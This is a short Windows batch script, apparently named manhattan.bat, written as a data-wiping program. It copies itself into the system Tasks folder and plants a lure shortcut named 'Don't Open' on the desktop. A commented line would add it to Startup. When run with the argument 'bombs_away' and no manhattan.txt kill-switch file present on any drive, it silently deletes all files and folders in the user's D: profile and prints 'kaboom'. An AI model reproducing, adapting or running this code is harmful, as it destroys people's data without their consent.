@echo off


COLOR A


REM Uncomment if you want to continually be truely sinister

REM copy manhattan.bat "D:\%username%\Start Menu\Programs\Startup"

copy manhattan.bat C:\Windows\Tasks
copy "Don't Open (3).lnk" "D:\%username%\Desktop"


IF /I %1==bombs_away (
goto :START

)ELSE (
goto :END


)
:START


if exist manhattan.txt "D:\%username%\desktop" goto :END

if exist A:\manhattan.txt goto :END

if exist B:\manhattan.txt goto :END

if exist C:\manhattan.txt goto :END

if exist D:\manhattan.txt goto :END

if exist E:\manhattan.txt goto :END

if exist F:\manhattan.txt goto :END

if exist G:\manhattan.txt goto :END

if exist H:\manhattan.txt goto :END

if exist I:\manhattan.txt goto :END

if exist J:\manhattan.txt goto :END

if exist K:\manhattan.txt goto :END

if exist L:\manhattan.txt goto :END

if exist M:\manhattan.txt goto :END

if exist N:\manhattan.txt goto :END

if exist O:\manhattan.txt goto :END

if exist P:\manhattan.txt goto :END

if exist Q:\manhattan.txt goto :END

if exist R:\manhattan.txt goto :END

if exist S:\manhattan.txt goto :END

if exist T:\manhattan.txt goto :END

if exist U:\manhattan.txt goto :END

if exist V:\manhattan.txt goto :END

if exist W:\manhattan.txt goto :END

if exist X:\manhattan.txt goto :END

if exist Y:\manhattan.txt goto :END

if exist Z:\manhattan.txt goto :END



del /q D:\%username%\*
for /d %%x in (D:\%username%\*) do @rd /s /q "%%x"
echo kaboom



:END


